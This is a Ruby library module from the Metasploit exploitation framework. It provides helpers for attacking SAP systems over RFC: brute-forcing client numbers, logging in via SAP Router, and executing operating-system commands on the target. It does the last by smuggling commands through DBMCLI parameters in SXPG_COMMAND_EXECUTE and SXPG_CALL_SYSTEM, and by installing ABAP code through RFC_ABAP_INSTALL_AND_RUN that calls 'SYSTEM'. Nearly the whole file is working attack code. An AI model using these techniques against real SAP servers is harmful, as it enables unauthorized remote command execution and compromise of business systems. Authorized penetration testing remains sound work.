# -*- coding: binary -*-

###
#
# Common SAP methods
#
###

begin
  require 'nwrfc'
rescue LoadError
  abort("[x] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.\n[-] Try export LD_LIBRARY_PATH=/usr/sap/rfcsdk/lib:/usr/sap/nwrfcsdk/lib")
end

module Msf
module Exploit::SAP
module RFC

  include NWRFC

  def initialize(info = {})
    super
    register_options(
      [
        Opt::RPORT(3300),
        OptString.new('CLIENT', [true, 'Client', '000']),
        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
      ], self.class)

    register_advanced_options(
      [
          OptInt.new('NWRFC_CALL_TIMEOUT', [true, 'Timeout for calls to native code', 30]),
      ], self.class)
  end

  def call_timeout
    datastore['NWRFC_CALL_TIMEOUT']
  end

  def system_number(rport=nil)
    if rport
      rport.to_s[-2..-1]
    else
      datastore['RPORT'].to_s[-2..-1]
    end
  end

  def client
    datastore['CLIENT']
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def client_list
    if client.nil?
      print_status("Using default SAP client list")
      clients = ['000', '001', '066']
    else
      if client =~ /^\d{3},/
        clients = datastore['CLIENT'].split(/,/)
        print_status("Brute forcing clients #{client}")
      elsif
        client =~ /^\d{3}-\d{3}\z/
        array = client.split(/-/)
        clients = (array.at(0)..array.at(1)).to_a
        print_status("Brute forcing clients #{client}")
      elsif
        client =~ /^\d{3}\z/
        clients = [client]
        print_status("Brute forcing client #{client}")
      else
        print_status("Invalid CLIENT - using default SAP client list instead")
        clients = ['000', '001', '066']
      end
    end

    clients
  end

  def auth_hash(rhost, rport, client, username, password)
    ashost = rhost
    sysnr = system_number(rport)

    if datastore['SRHOST']
      ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}"
    end

    {"user" => username, "passwd" => password, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
  end

  #
  # Logs into a SAP RFC endpoint. Calling this with a block ensures that the
  # connection is closed after use and it spawns the RFC call in a new thread
  # allowing datastore['NWRFC_CALL_TIMEOUT'] to determine how long to wait for
  # the call to return. This is required to protect against calls to non-
  # returning functions (e.g. starting a process that doesn't close).
  #
  # If used without a block the caller should make sure the connection is
  # closed and the connection object should exist only within the bounds of
  # any new threads created. See SAP note 513386:
  #
  # The recommended procedure for multithreaded applications is, however,
  # not to share any JCO.Client instances via several threads at all, but
  # rather to use an individual instance for each thread.The JCo client
  # pooling mechanism offers a special service here, as you can use it to
  # fetch a client from the pool as required, use it for your function call
  # and then return it to the pool.Multithreading and synchronization problems
  # do not then even arise
  #
  def login(rhost, rport, client, username, password)
    conn = nil
    return conn unless block_given?

    r = Rex::Text.rand_text_alphanumeric(6)
    begin
      t = framework.threads.spawn("nwrfc-#{r}", false) do
        ah = auth_hash(rhost, rport, client, username, password)
        begin
          conn = Connection.new(ah)
          yield conn
        rescue NWError => e
          case e.code
            when :RFC_COMMUNICATION_FAILURE
              errno, errtext = parse_comm_exception(e)
              vprint_error("#{rhost}:#{rport} [SAP] #{e.code} - #{errtext}")
            else
              vprint_status("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
          end

          raise e
        ensure
          conn.disconnect if conn
        end
      end

      res = t.join(call_timeout)
      if res.nil?
        print_error("#{rhost}:#{rport} [SAP] NWRFC Call Time Out")
      end
    ensure
      t.kill
    end

    nil
  end

  def run_function(conn, function_name, opts)
    fc = nil

    function = conn.get_function(function_name)
    fc = function.get_function_call

    opts.each do |key,value|
      fc[key] = value
    end

    fc.invoke

    fc
  end

  def parse_comm_exception(exception)
    errno = nil
    errno_text = nil
    exception.message.each_line do |line|
      if line =~ /^ERRNO\s+(\d+)$/
        errno = $1
      elsif line =~ /^ERRNO TEXT\s+([\w ]+)$/
        errno_text = $1
      elsif line =~ /^ERROR\s+(.+)$/
        errno_text = $1
      end
    end

    return errno, errno_text
  end

  def dbmcli_write(os, cmd, file, bg=false)
    raise RuntimeError, "Empty command" if cmd.blank?

    random_db = Rex::Text.rand_text_alpha(1)

    command = ''
    if os.downcase.include? 'linux'
      cmd = cmd.gsub(" ","\t")
      command = "-o /tmp/#{file} -n #{random_db}\n!"
      command << cmd
      command << "\t&" if bg
      command << "\n"
    else
      space = "%programfiles:~10,1%"
      cmd = cmd.gsub(" ",space)
      command = "-o c:\\#{file} -n #{random_db}\r\n!"
      command << "#{cmd}\r\n"
    end

    command
  end

  def dbmcli_execute(os, file)
    command = ''
    if os.downcase.include? 'linux'
      command = "-ic /tmp/#{file}"
    else
      command = "-ic c:\\#{file}"
    end

    command
  end

  def dbmcli_sxpg_execute(os, cmd, opts, call_system=true)
    raise RuntimeError, "Empty command" if cmd.blank?

    # this code is common for sxpg_call_system and sxpg_command_execute
    # so just grab a pointer to the correct rfc technique
    if call_system
      rfc = method(:sxpg_call_system)
    else
      rfc = method(:sxpg_command_execute)
    end

    file = Rex::Text.rand_text_alpha(4)

    rhost = opts[:rhost]
    rport = opts[:rport]
    client = opts[:client]
    user = opts[:user]
    pass = opts[:pass]
    bg = opts[:bg]

    command = dbmcli_write(os, cmd, file, bg)

    result = nil

    login(rhost, rport, client, user, pass) do |conn|
      conn.connection_info

      begin
        opts = {}
        opts[:COMMANDNAME] = 'DBMCLI'
        opts[:OPERATINGSYSTEM] = 'ANYOS' unless call_system
        opts[:ADDITIONAL_PARAMETERS] = command
        data  = rfc.call(conn, opts)

        if data =~ /No such file or directory/im
          print_error("#{rhost}:#{rport} [SAP] DBMCLI does not exist on this host")
        else
          run_command = dbmcli_execute(os, file)
          opts[:ADDITIONAL_PARAMETERS] = run_command
          data  = rfc.call(conn, opts)

          if data.blank?
            print_error("#{rhost}:#{rport} [SAP] No output received")
          elsif data.include? '---'
            start_idx = data.index('---') + 3
            end_idx = data.index('---', start_idx)
            result = data[start_idx...end_idx]
          end
        end
      rescue NWError => e
        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
      end
    end

    result
  end

  def sxpg_command_execute(conn, opts)
    data = ''

    fc = run_function(conn, "SXPG_COMMAND_EXECUTE", opts)

    if opts[:ADDITIONAL_PARAMETERS].length > 255
      raise RuntimeError, "SXPG_COMMAND_EXECUTE ADDITIONAL_PARAMETERS exceeds 255 characters: #{opts[:ADDITIONAL_PARAMETERS].length}"
    end

    data_length = fc[:EXEC_PROTOCOL].size

    0.upto(data_length-1) do |i|
      data << fc[:EXEC_PROTOCOL][i][:MESSAGE] << "\n"
    end

    data
  end

  def sxpg_call_system(conn, opts)
    data = ''

    fc = run_function(conn, "SXPG_CALL_SYSTEM", opts)

    if opts[:ADDITIONAL_PARAMETERS].length > 128
      raise RuntimeError, "SXPG_CALL_SYSTEM ADDITIONAL_PARAMETERS exceeds 128 characters: #{opts[:ADDITIONAL_PARAMETERS].length}"
    end

    data_length = fc[:EXEC_PROTOCOL].size

    0.upto(data_length-1) do |i|
      data << fc[:EXEC_PROTOCOL][i][:MESSAGE] << "\n"
    end

    data
  end

  def rfc_abap_install_and_run(conn, code)
    conn.connection_info
    function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
    fc = function.get_function_call
    code.each_line do |line|
      fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
    end

    fc.invoke

    fc[:WRITES]
  end

  def rfc_abap_install_and_run_cmd(conn, cmd)
    escapes = cmd.count("'")
    final_length = cmd.length + escapes
    raise RuntimeError, "Command is too large: #{final_length}" if final_length > 255

    code = "REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING.\r\n"
    code << "TYPES lt_line(255) TYPE c.\r\n"
    code << "DATA lv_cmd(#{final_length}) TYPE c.\r\n"
    code << "DATA lt_result TYPE STANDARD TABLE OF lt_line WITH HEADER LINE.\r\n"
    code << "lv_cmd =\r\n"

    cmd_split = cmd.scan(/.{1,50}/)
    cmd_split.each do |line|
      l = line.gsub("'","''")
      if line == cmd_split.last
        code << "'#{l}'.\r\n"
      else
        code << "'#{l}'&\r\n"
      end
    end
    code << "CALL 'SYSTEM' ID 'COMMAND' FIELD lv_cmd\r\n"
    code << "ID 'TAB' FIELD lt_result-*sys*.\r\n"
    code << "LOOP AT lt_result.\r\n"
    code << "WRITE : / lt_result.\r\n"
    code << "ENDLOOP.\r\n"

    result = rfc_abap_install_and_run(conn, code)
    data = ''
    result.each do |row|
      data << row[:ZEILE] << "\n"
    end

    data
  end

end
end
end


